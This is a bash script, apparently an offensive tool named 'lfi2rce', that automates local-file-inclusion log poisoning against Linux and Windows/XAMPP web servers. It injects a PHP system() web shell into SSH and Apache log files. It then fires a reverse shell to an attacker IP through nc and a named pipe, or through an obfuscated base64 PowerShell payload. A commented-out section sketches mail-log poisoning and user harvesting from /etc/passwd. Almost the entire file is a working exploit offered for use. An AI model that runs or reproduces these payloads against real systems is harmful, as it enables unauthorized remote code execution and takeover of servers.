#!/bin/bash

###################################################################################################   
# Local File Inclusion to Remote Code Execution                                                   #
# Automated proof of concept tool to poison ssh and apache2 log files                             #
# linux ssh (/var/log/auth.log)                                                                   #
# linux apache2 (/var/log/apache2/access.log)                                                     #
# windows xampp/apache (C:/xampp/apache/logs/access.log) use --windows option for windows hosts   #
#                                                                      by 0bfxgh0st*              #
###################################################################################################

#########################################################
attacker_ip="10.0.2.15"   # CHANGE ME BY ATTACKER IP    #
attacker_port="4444"      # CHANGE ME BY ATTACKER PORT  #
#########################################################
#########################################################################################
ssh_port="22"             # CHANGE ME IF TARGET MACHINE HAS ANOTHER SSH PORT NUMBER     #
apache_port="80"          # CHANGE ME IF TARGET MACHINE HAS ANOTHER APACHE PORT NUMBER  #
#########################################################################################

# SETTING TARGET HOST
### solving target_ip host without http grepable for ssh

if [[ "$1" != "http"* ]]
then
        target_ip=$(printf -- "$1" | awk -F[/:] '{print $1}')
else
	target_ip=$(printf -- "$1" | awk -F[/:] '{print $4}')
fi


function header(){
cat << "EOF"
.__   _____._____________________________ ___________
|  |_/ ____\__\_____  \______   \_   ___ \\_   _____/
|  |\   __\|  |/  ____/|       _/    \  \/ |    __)_ 
|  |_|  |  |  /       \|    |   \     \____|        \
|____/__|  |__\_______ \____|_  /\______  /_______  /
                      \/      \/        \/        \/ 
EOF
}

header

###########################################################################################
function HELP(){
	printf -- "LFI TO RCE LOG POISONING v0.1 (beta)\n\n"
	printf -- "Description:\n"
	printf -- "lfi2rce will try spawn a shell by poisoning SSH /var/log/auth.log and APACHE2 /var/log/apache2/access.log log files\n\n"
	printf -- "Options:\n"
	printf -- "\n--windows      set lfi2rce for windows hosts will try poison C:/xampp/apache/logs/access.log\n\n"
	printf -- "Usage bash lfi2rce <url>\n"
	printf -- "Example bash lfi2rce http://ghost.server/index.php?page= --windows\n\n"
	exit
}
###########################################################################################

function linux_backdoor(){
	if [ "$1" != "" ];
	then
		printf -- "\nTargeting URL $1$file_to_poison\n\n"

	fi

	payload=$(printf "mknod /tmp/backpipe p;/bin/sh 0</tmp/backpipe | nc $attacker_ip $attacker_port 1>/tmp/backpipe" | tr -s ' ' +)
        curl "$1$file_to_poison&cmd="$payload &
	nc -lvp $attacker_port
}
######################################################################


#function linux_backdoor(){           # WAY 2 FOR LINUX DONT DELETE ME (netcat way if you are sure that exists in the target) 
#	if [ "$1" != "" ];
#	then
#		printf -- "\nTargeting URL $1\n"

#	fi

#	payload=$(printf "nc -lvp $attacker_port -e /bin/bash" | tr -s ' ' +)
#       curl "$1$file_to_poison&cmd="$payload &

#	printf "[connected]\n"
#	nc $attacker_ip $attacker_port

#}

#################################################################

function lfi_and_backdoor_windows(){

	apache_log_injection=$(echo "GET /<?php \$sysvar='system';echo \$sysvar(\$_GET['cmd']); ?>" | nc "$target_ip" "$apache_port" > /dev/null 2>&1)
	printf "$apache_log_injection"

	# CONCEPT WINDOWS EXPLOIT

	file_to_poison="C:/xampp/apache/logs/access.log"
	curl -s "$1$file_to_poison&cmd=powershell.exe%20-ExecutionPolicy%20Bypass%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAyADYAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkAOwA=" 2>/dev/null &
	nc -lvp $attacker_port
}


function lfi_linux(){

##################### SSH LOG POISON

ssh_log_file="/var/log/auth.log"

for file_to_poison in $ssh_log_file
do
        name=$(printf -- "$file_to_poison" | awk -F'/' '{print $NF}')
        curl -s "$1$file_to_poison" > "/tmp/$name"

        check_ssh_string=$(grep 'CRON\|cron\|session\|pam\|terminating' "/tmp/$name")

        if [[ "$check_ssh_string" == *"terminating"* ]] || [[ "$check_ssh_string" == *"CRON"* ]] || [ "$check_ssh_string" == *"cron"* ] || [ "$check_ssh_string" == *"session"* ] || [ "$check_ssh_string" == *"pam"* ];
        then
                printf -- "[\e[0;32m+\e[0m] ssh is poisoneable ($file_to_poison)\n"
                printf -- "[\e[0;32m+\e[0m] Poisoning $file_to_poison file\n"
                ssh_log_injection=$(ssh '<?php $sysvar="system";echo $sysvar($_GET['cmd']); ?>'@"$target_ip" -p "$ssh_port" > /dev/null 2>&1)
		printf -- "$ssh_log_injection"
		printf -- "[\e[0;32m+\e[0m] ssh poisoning completed\n"
		printf -- "[\e[0;32m+\e[0m] Spawning shell\n"
                linux_backdoor "$1"
        else
                printf -- "[\e[0;31m-\e[0m] ssh log NOT poisoneable ($file_to_poison)\n"
        fi

done
##################################################################################################




############## APACHE2 LOG POISON ################

apache_log_file="/var/log/apache2/access.log"

for file_to_poison in $apache_log_file
do
	name=$(printf -- "$file_to_poison" | awk -F'/' '{print $NF}')
	curl -s "$1$file_to_poison" > "/tmp/$name"

	check_apache_string=$(grep 'http\|HTTP\|GET\|/' "/tmp/$name")

	if [[ "$check_apache_string" == *"http"* ]] || [[ "$check_apache_string" == *"HTTP"* ]] || [[ "$check_apache_string" == *"GET"* ]];
	then
	      	printf -- "[\e[0;32m+\e[0m] apache2 is poisoneable ($file_to_poison)\n"
	        printf -- "[\e[0;32m+\e[0m] Poisoning $file_to_poison file\n"

		apache_log_injection=$(echo "GET /<?php \$sysvar='system';echo \$sysvar(\$_GET['cmd']); ?>" | nc "$target_ip" "$apache_port" > /dev/null 2>&1)
		printf "$apache_log_injection"

		printf -- "[\e[0;32m+\e[0m] apache2 log poisoning completed\n"
		printf -- "[\e[0;32m+\e[0m] Spawning shell\n"

		linux_backdoor "$1"
	else
		printf -- "[\e[0;31m-\e[0m] apache log NOT poisoneable ($file_to_poison)\n"
	fi

done
###################################################

}




if [[ "$1" == "" ]]
then
	HELP
	exit
fi

if [[ "$2" == "--windows" ]]
then
	printf "[\e[1;33m+\e[0m] Windows Os mode\n\n"
	apache_log_file="C:/xampp/apache/logs/access.log"
	lfi_and_backdoor_windows "$1"
	exit

else
	printf "[\e[1;33m+\e[0m] Linux Os mode\n\n"
	lfi_linux "$1"
fi










##### next features
#
#
################### THIS FEATURE IS UNAVAILABLE BY THE MOMENT ################################
########### MAIL 
#smtp_port="25"


#curl -s "$1"/etc/passwd | grep 'home\|bash'\|sh | awk -F: '{print $1}' > /tmp/get_users
#cat /tmp/get_users
#printf -- "\n"
#fetch_users=$(cat /tmp/get_users)


#for mail_users in $fetch_users;
#do

#	curl -s "$1/var/mail/$mail_users" > /tmp/$mail_users

#	check_mail_string=$(grep 'From\|FROM\|To\TO\|@\|Message\|MESSAGE\|Postfix\|POSTFIX' "/tmp/$mail_users")

#	if [[ "$check_mail_string" == *"From"* ]] || [[ "$check_mail_string" == *"FROM"* ]] || [[ "$check_mail_string" == *"To"* ]] || [[ "$check_mail_string" == *"TO"* ]] || [[ "$check_mail_string" == *"@"* ]] || [[ "$check_mail_string" == *"Message"* ]] || [[ "$check_mail_string" == *"MESSAGE"* ]] || [[ "$check_mail_string" == *"Postfix"* ]] || [[ "$check_mail_string" == *"POSTFIX"* ]];
#	then

#		printf -- "[\e[0;32m+\e[0m] MAIL LOG SEEMS VULNERABLE TO LFI TO RCE [\e[0;32m+\e[0m]\n$mail_users looks poisoneable\n"
#		printf -- "Trying MAIL LOG POISON VIA TELNET SMTP\n"
#		printf -- "THIS NEED TO KNOW THE USERS...TRY EXTRACT MANUALLY IF THIS FAIL\n"
#		printf -- "TELNET NOT SUPPORT DNS NAME AT THE MOMENT ONLY IP ADDRESS\n\n"
#		printf -- "WAIT TILL CONNECT AND TYPE THE FOLLOWING\n"
#		printf -- "REMEMBER TYPE quit when finish send email to continue executing this script that loads little shelly at the end\n\n"
#		printf -- "MAIL FROM: <mark>\n"
#		printf -- "RCPT TO: Helios\n"
#		printf -- "data\n"
#		printf -- "<?php \$sysvar=\"system\";echo \$sysvar(\$_GET['cmd']); ?>\n"
#		printf -- ".\n"


#		telnet $target_ip $smtp_port

#		file_to_poison="/var/mail/$mail_users"

#		_little_shelly "$1"

#	else

#        	printf -- "[\e[0;31m-\e[0m] Nothing found in mail\n"

#	fi



#done
######################################################################################################
######################################################################################################




